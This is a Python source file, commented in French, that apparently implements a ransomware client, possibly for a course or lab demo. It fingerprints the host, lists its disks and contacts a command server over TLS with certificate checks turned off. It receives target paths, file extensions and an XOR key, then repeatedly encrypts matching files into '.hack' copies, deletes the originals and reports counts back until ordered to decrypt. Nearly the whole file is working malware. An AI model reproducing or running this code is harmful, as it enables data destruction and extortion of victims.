import hashlib
import os
import subprocess
import time
import platform
import socket
import ssl
import shutil
import itertools

from utile import config
from utile.config import print_config
from utile.message import set_message
from utile.network import send_message, receive_message, LOCAL_IP



# Charger la configuration au démarrage du script
config.load_config("config/ransomware.cfg", "config/ransomware_key.bin")
FRONTAL_SERVER_IP = config.get_config("IP_SERV_FRONT")
FRONTAL_SERVER_PORT_TLS = config.get_config("PORT_SERV_FRONT")
# S'assurer que SOCKET_TIMEOUT est un entier si c'est ce que settimeout attend
raw_socket_timeout = config.get_config("CONN_RETRY_SERV_FRONT")
REDEMERRAGE_DEMO = True



try:
    SOCKET_TIMEOUT = 9000 #int(raw_socket_timeout) if raw_socket_timeout is not None else 60
except ValueError:
    print(
        f"Attention: La valeur de CONN_RETRY_SERV_FRONT ('{raw_socket_timeout}') n'est pas un entier valide. Utilisation de 60s par défaut.")
    SOCKET_TIMEOUT = 60


# LAST_STATE sera lu de la config dans main au moment nécessaire.
def redemarrer_demo():
    config.set_config('LAST_STATE', None)
    config.set_config('HASH_VICTIM', None)
    config.save_config("config/ransomware.cfg", "config/ransomware_key.bin")

def chiffre_xor(cle, chemin_fichier):
    try:
        cle_bytes = cle.encode('utf-8')
        if not cle_bytes:

            return False
        with open(chemin_fichier, 'rb') as f:
            contenu_original = f.read()
        cycle_cle = itertools.cycle(cle_bytes)
        contenu_chiffre = bytes([b ^ next(cycle_cle) for b in contenu_original])
        with open(chemin_fichier, 'wb') as f:
            f.write(contenu_chiffre)
        return True
    except FileNotFoundError:
        print(f"Erreur : Le fichier '{chemin_fichier}' n'a pas été trouvé.")
        return False
    except Exception:  # E e: print(f"Erreur lors du chiffrement XOR de '{chemin_fichier}': {e}")
        return False


def dechiffre_xor(cle, chemin_fichier):
    return chiffre_xor(cle, chemin_fichier)


def identifiant_victime():
    nom_systeme = platform.node()
    timbre_temps = str(int(time.time()))
    raw_key = f"{nom_systeme}_{timbre_temps}".encode()
    hash_victime = hashlib.sha256(raw_key).hexdigest()
    return hash_victime


def os_type():
    os_name = platform.system().lower()
    if "server" in os_name or "linux" in os_name:
        return "SERVER"
    return "WORKSTATION"


def listing_disques():
    system = platform.system().lower()
    partitions_str = "Unknown"
    try:
        if system == "windows":
            result = subprocess.run(["wmic", "logicaldisk", "get", "caption"], stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE, text=True, check=True, timeout=5)
            partitions = result.stdout.split("\n")
            partitions = [p.strip() for p in partitions if p.strip() and p.lower() != "caption"]
            partitions_str = ', '.join(partitions)
        elif system == "linux" or system == "darwin":
            result = subprocess.run(["df", "-h"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
                                    check=True, timeout=5)
            lines = result.stdout.split("\n")[1:]
            disks = []
            for line in lines:
                parts = line.split()
                if len(parts) > 0 and parts[0].startswith('/'):
                    disks.append(parts[0])
            partitions_str = ', '.join(disks)
        else:
            # print("Système d'exploitation non supporté pour lister les partitions.") # Rendu moins verbeux
            partitions_str = "UnsupportedOS"
    except (subprocess.CalledProcessError, FileNotFoundError,
            subprocess.TimeoutExpired):  # as e: print(f"Erreur lors du listage des disques: {e}")
        partitions_str = "ErrorListingDisks"
    return partitions_str


def creation_infos_victime():
    # MODIFIÉ : Sauvegarder le HASH_VICTIM dès sa création si c'est une nouvelle victime
    # ou le charger s'il existe déjà pour assurer la cohérence.
    # Pour cette implémentation, on va supposer que si LAST_STATE est None, on génère un nouveau HASH.
    # Sinon, on le charge. La logique de phase_crypt gérera la sauvegarde.
    current_hash = config.get_config("HASH_VICTIM")
    if current_hash:  # Si un hash existe déjà (par exemple d'une exécution précédente)
        hash_victime = current_hash
        print(f"[INFO] Utilisation du HASH_VICTIM existant: {hash_victime}")
    else:  # Pas de hash existant, ou on veut en générer un nouveau (si LAST_STATE est None par exemple)
        hash_victime = identifiant_victime()
        print(f"[INFO] Nouveau HASH_VICTIM généré: {hash_victime}")
        # La sauvegarde effective se fera dans phase_crypt

    type_os = os_type()
    disques_victime = listing_disques()
    return [hash_victime, type_os, disques_victime]


def reception_cibles(connexion_tls, params_crypt_key_list):
    crypt_req = set_message("crypt_req", params=params_crypt_key_list)
    print(f"Envoi de CRYPT_REQ: {crypt_req}")
    send_message(connexion_tls, crypt_req)

    reponse = receive_message(connexion_tls)
    print(f"Réponse CRYPT_RESP reçue: {reponse}\n")

    if reponse and "SETTING" in reponse and isinstance(reponse["SETTING"], dict):
        disk_target = reponse["SETTING"].get("DISKS", [])
        path_target = reponse["SETTING"].get("PATHS", [])
        ext_target = reponse["SETTING"].get("FILE_EXT", [])
        freq_target_raw = reponse["SETTING"].get("FREQ")
        try:
            freq_target = int(freq_target_raw) if freq_target_raw is not None else 300  # Défaut à 5 min
        except ValueError:
            print(f"Attention: FREQ ('{freq_target_raw}') invalide. Utilisation de 300s.")
            freq_target = 300

        cle_chiffrement_recue = reponse["SETTING"].get("KEY")

        if not cle_chiffrement_recue:
            print("Avertissement : Clé de chiffrement non reçue du serveur.")
        return disk_target, path_target, ext_target, freq_target, cle_chiffrement_recue
    else:
        print("Erreur: Réponse invalide ou 'SETTING' manquant du serveur.")
        return [], [], [], 300, None


def _chiffre(fpath, cle_chiffrement):
    if not os.path.isfile(fpath):
        return False
    if fpath.endswith(".hack"):  # Ne pas chiffrer à nouveau
        return False
    nom_fichier_chiffre = fpath + ".hack"
    try:
        shutil.copy2(fpath, nom_fichier_chiffre)
        if chiffre_xor(cle_chiffrement, nom_fichier_chiffre):
            print(f"Fichier chiffré : {nom_fichier_chiffre}")  # Message de succès
            os.remove(fpath)  # Supprimer l'original après chiffrement réussi de la copie
            return True
        else:  # Le chiffrement XOR a échoué
            if os.path.exists(nom_fichier_chiffre):
                os.remove(nom_fichier_chiffre)  # Nettoyer la copie échouée
            return False
    except Exception:  # as e: print(f"Erreur dans _chiffre pour {fpath}: {e}")
        if os.path.exists(nom_fichier_chiffre):  # S'assurer de nettoyer si la copie a eu lieu
            try:
                # On ne veut pas supprimer l'original si le chiffrement a échoué après copie
                # On supprime seulement la copie (.hack)
                if nom_fichier_chiffre != fpath:  # Au cas où
                    os.remove(nom_fichier_chiffre)
            except OSError:
                pass  # Ignorer si la suppression de la copie échoue
        return False


def explore(directory):
    elements = []
    for root, dirs, files in os.walk(directory):
        for f in files:
            elements.append(os.path.join(root, f))
    return elements


def file_type(fpath):
    if os.path.isdir(fpath):
        return "dir", ""
    elif os.path.isfile(fpath):
        return "file", os.path.splitext(fpath)[1].lower() or "unknown"
    return "invalid path", ""


# MODIFIÉ: stat_attaque utilise la clé et la connexion TLS, et gère sa propre boucle.
def stat_attaque(ext_target, disk_target, path_target, freq_target, cle_chiffrement, connexion_tls):
    print(f"Lancement de l'attaque en mode continu. Scan toutes les {freq_target} secondes.")
    print("Extensions à chiffrer : ", ext_target, "\n")

    # Ces vérifications sont bonnes, mais la clé est déjà vérifiée dans phase_pending
    # if not cle_chiffrement: print("Erreur : Aucune clé..."); return
    # if not disk_target or not path_target: print("Aucun disque..."); return

    hash_victim = config.get_config("HASH_VICTIM")  # Doit être défini
    if not hash_victim:
        print("[ERREUR] stat_attaque: HASH_VICTIM non trouvé dans la configuration.")
        return False  # Indiquer un échec pour que phase_pending puisse réagir

    try:
        while True:
            compte_les_hommes_cycle = 0
            statistiques_extensions_cycle = {}


            print(f"--- Nouveau cycle de scan ({time.strftime('%Y-%m-%d %H:%M:%S')}) ---")
            for disk_letter in disk_target:
                for path_segment in path_target:
                    base_dir_to_scan = os.path.join(disk_letter, path_segment.lstrip(
                        '/\\')) if platform.system() == "Windows" else path_segment
                    if not os.path.isdir(base_dir_to_scan):
                        continue
                    print(f"Exploration du dossier : {base_dir_to_scan}")
                    target_elements = explore(base_dir_to_scan)
                    for chemin_element in target_elements:
                        filetype_info = file_type(chemin_element)
                        if isinstance(filetype_info, tuple) and filetype_info[0] == "file":
                            extension = filetype_info[1]
                            if extension in ext_target:
                                if _chiffre(chemin_element, cle_chiffrement):
                                    compte_les_hommes_cycle += 1
                                    statistiques_extensions_cycle[extension] = statistiques_extensions_cycle.get(
                                        extension, 0) + 1

            print(f"\n--- Fin du cycle de scan ---")
            print(f"{compte_les_hommes_cycle} nouveau(x) fichier(s) chiffré(s) dans ce cycle.")

            nb_files_total = config.get_config("NB_FILES")  # Obtenir avec une valeur par défaut
            if isinstance(nb_files_total, str): nb_files_total = int(nb_files_total) if nb_files_total.isdigit() else 0

            if compte_les_hommes_cycle > 0:
                nb_files_total += compte_les_hommes_cycle
                config.set_config("NB_FILES", nb_files_total)
                # La sauvegarde de la config se fera globalement à la fin ou si l'état change.
                print("Statistiques des extensions chiffrées pour ce cycle:", statistiques_extensions_cycle)
            else:
                print("Aucun nouveau fichier correspondant aux critères n'a été chiffré dans ce cycle.")

            print(f"Nombre total de fichiers chiffrés (cumulatif): {nb_files_total}")
            pending_msg = set_message("PENDING_MSG", [hash_victim, nb_files_total])  # Envoyer le total cumulé
            send_message(connexion_tls, pending_msg)

            print("[INFO] En attente d'une instruction du serveur (DECRYPT pour arrêter)...")
            reponse_serveur = receive_message(connexion_tls)  # Bloquant
            if reponse_serveur and isinstance(reponse_serveur, str) and reponse_serveur.upper() == "DECRYPT":
                print("[INFO] Instruction DECRYPT reçue du serveur. Arrêt de la phase d'attaque.")
                config.set_config("LAST_STATE", "DECRYPT_ORDERED")  # Nouvel état
                # La sauvegarde de la config se fera dans main après le retour de phase_pending
                return True  # Indiquer que l'ordre de déchiffrement a été reçu
            else:
                print(f"Réponse du serveur : {reponse_serveur}. Poursuite de l'attaque.")
                print(f"Attente de {freq_target} secondes avant le prochain scan...")
                print("---------------------------------------------------\n")
                time.sleep(freq_target)


    except KeyboardInterrupt:
        print("\n[!] Attaque (stat_attaque) interrompue par l'utilisateur (Ctrl+C).")
        return False  # Indiquer une interruption
    except Exception as e:
        print(f"[!] Une erreur inattendue est survenue pendant stat_attaque : {e}")
        return False  # Indiquer une erreur


# MODIFIÉ: phase_crypt sauvegarde maintenant la clé et les autres infos.
def phase_crypt(connexion_tls):
    print("[PHASE CRYPT] Initialisation...")

    params_victime_initiaux = creation_infos_victime()  # Contient [hash, os, disks_string]

    # reception_cibles demande la config au serveur basée sur params_victime_initiaux
    disk_target, path_target, ext_target, freq_target, cle_chiffrement_recue = reception_cibles(connexion_tls,
                                                                                                params_victime_initiaux)

    if not cle_chiffrement_recue:
        print("[ERREUR] phase_crypt: N'a pas reçu de clé de chiffrement valide du serveur.")
        return False  # Échec de la phase

    # Sauvegarder toutes les informations de configuration nécessaires
    config.set_config('HASH_VICTIM',
                      params_victime_initiaux[0])
    config.set_config("DISKS_TARGET", disk_target)
    config.set_config('PATHS_TARGET', path_target)
    config.set_config('FILE_EXT_TARGET', ext_target)
    config.set_config('FREQ_SCAN', freq_target)
    config.set_config('NB_FILES', 0)  # Initialiser le compteur de fichiers chiffrés
    config.set_config('LAST_STATE', 'CRYPT')
    config.save_config("config/ransomware.cfg", "config/ransomware_key.bin")
    # Sauvegarder le fichier de configuration

    print("[INFO] phase_crypt: Configuration initiale sauvegardée. LAST_STATE mis à CRYPT.")
    return True



# MODIFIÉ: phase_pending charge la clé et appelle stat_attaque.
def phase_pending(connexion_tls):
    print("[PHASE PENDING] Démarrage de la surveillance et du chiffrement périodique...")
    # Charger les configurations nécessaires pour stat_attaque
    current_hash = config.get_config("HASH_VICTIM")
    disk_target = config.get_config("DISKS_TARGET")
    path_target = config.get_config("PATHS_TARGET")
    ext_target = config.get_config("FILE_EXT_TARGET")
    freq_target = config.get_config("FREQ_SCAN")
    cle_chiffrement_chargee = config.get_config("KEY")

    if not all([current_hash, disk_target is not None, path_target is not None, ext_target is not None,
                freq_target is not None, cle_chiffrement_chargee]):
        print("[ERREUR] phase_pending: Informations de configuration manquantes. Impossible de démarrer l'attaque.")
        print(
            f"Debug: HASH={current_hash}, DISKS={disk_target}, PATHS={path_target}, EXT={ext_target}, FREQ={freq_target}, KEY_EXISTS={bool(cle_chiffrement_chargee)}")
        return False  # Échec

    # Appeler stat_attaque avec les paramètres chargés
    # stat_attaque gère maintenant sa propre boucle et la communication PENDING_MSG
    attaque_terminee_par_decrypt = stat_attaque(ext_target, disk_target, path_target, freq_target,
                                                cle_chiffrement_chargee, connexion_tls)

    if attaque_terminee_par_decrypt:
        print("[INFO] phase_pending: Ordre de déchiffrement reçu et traité par stat_attaque.")
        # LAST_STATE a été mis à jour dans stat_attaque et sera sauvegardé dans main
        return True  # Indique que la phase pending s'est terminée car un ordre DECRYPT est arrivé
    else:
        print("[INFO] phase_pending: Terminé (soit par erreur, soit par interruption).")
        return False


# MODIFIÉ: Main gère maintenant les phases en fonction de LAST_STATE
if __name__ == '__main__':
    print("--- Démarrage du Ransomware ---")
    # Le chargement initial de la config (y compris LAST_STATE) est fait au début du script.
    if REDEMERRAGE_DEMO:
        redemarrer_demo()

    connexion_tls = None
    sock = None

    try:
        print("[ETAPE 1] Établissement de la connexion TLS avec le serveur frontal...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(SOCKET_TIMEOUT)  # SOCKET_TIMEOUT est chargé depuis la config

        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        print(f"Tentative de connexion à {FRONTAL_SERVER_IP}:{FRONTAL_SERVER_PORT_TLS}...")
        sock.connect((FRONTAL_SERVER_IP, FRONTAL_SERVER_PORT_TLS))
        print("Connexion TCP établie.")
        connexion_tls = context.wrap_socket(sock, server_hostname=FRONTAL_SERVER_IP)
        print(f"[+] Connecté au serveur frontal via TLS sur le port {FRONTAL_SERVER_PORT_TLS}")

        # Logique des phases
        # Lire LAST_STATE à chaque fois pour avoir la valeur la plus à jour
        current_state = config.get_config("LAST_STATE")
        print(f"[INFO] État actuel chargé depuis la configuration : {current_state}")

        if current_state is None:  # Première exécution ou état réinitialisé
            print("[ETAPE 2] Exécution de la phase d'initialisation (phase_crypt)...")
            if phase_crypt(connexion_tls):
                # phase_crypt a sauvegardé la config avec LAST_STATE='CRYPT'
                current_state = 'CRYPT'  # Mettre à jour l'état local pour la suite
                print("[INFO] phase_crypt terminée avec succès.")
            else:
                print("[ERREUR] Échec de phase_crypt. Arrêt du ransomware.")
                raise Exception("Échec de l'initialisation de phase_crypt.")  # Provoque la sortie via le finally

        if current_state == 'CRYPT':
            print("[ETAPE 2Bis] Exécution de la phase d'attaque et d'attente (phase_pending)...")
            phase_pending(connexion_tls)  # Gère sa propre boucle et la communication PENDING
            # Après phase_pending, l'état pourrait avoir changé
            # La sauvegarde de la config reflétant ce nouvel état se fait à la fin.
            print("[INFO] phase_pending terminée.")

        current_final_state = config.get_config("LAST_STATE")
        if current_final_state == 'DECRYPT':
            print("[INFO] Le serveur a ordonné le déchiffrement. Le ransomware va s'arrêter.")

            # Pour l'instant, on s'arrête.
            pass  # Le programme va se terminer

        elif current_state not in [None, 'CRYPT']:
            print(f"[ATTENTION] État inconnu ou non géré rencontré: {current_state}. Le ransomware va s'arrêter.")


    except socket.timeout:
        print(
            f"Timeout : Aucune réponse reçue du serveur {FRONTAL_SERVER_IP}:{FRONTAL_SERVER_PORT_TLS} après {SOCKET_TIMEOUT} secondes.")
    except ssl.SSLError as e:
        print(f"[!] Erreur SSL/TLS lors de la connexion à {FRONTAL_SERVER_IP}:{FRONTAL_SERVER_PORT_TLS}: {e}")
    except ConnectionRefusedError:
        print(f"[!] Connexion refusée par le serveur {FRONTAL_SERVER_IP}:{FRONTAL_SERVER_PORT_TLS}.")
    except Exception as e:
        print(f"[!] Une erreur inattendue et non gérée est survenue dans main: {e}")
        import traceback

        traceback.print_exc()  # Imprimer la trace de la pile pour le débogage
    finally:
        # Sauvegarder la configuration une dernière fois pour persister NB_FILES et le dernier LAST_STATE
        if config.save_config("config/ransomware.cfg", "config/ransomware_key.bin"):
            print("[INFO] Configuration finale sauvegardée.")
        else:
            print("[ATTENTION] Échec de la sauvegarde de la configuration finale.")

        if connexion_tls:
            print("Fermeture de la connexion TLS.")
            try:
                connexion_tls.close()
            except Exception as e_close_tls:
                print(f"Erreur lors de la fermeture de la connexion TLS: {e_close_tls}")
        elif sock:
            print("Fermeture du socket brut.")
            try:
                sock.close()
            except Exception as e_close_sock:
                print(f"Erreur lors de la fermeture du socket brut: {e_close_sock}")
        print("--- Ransomware Terminé ---")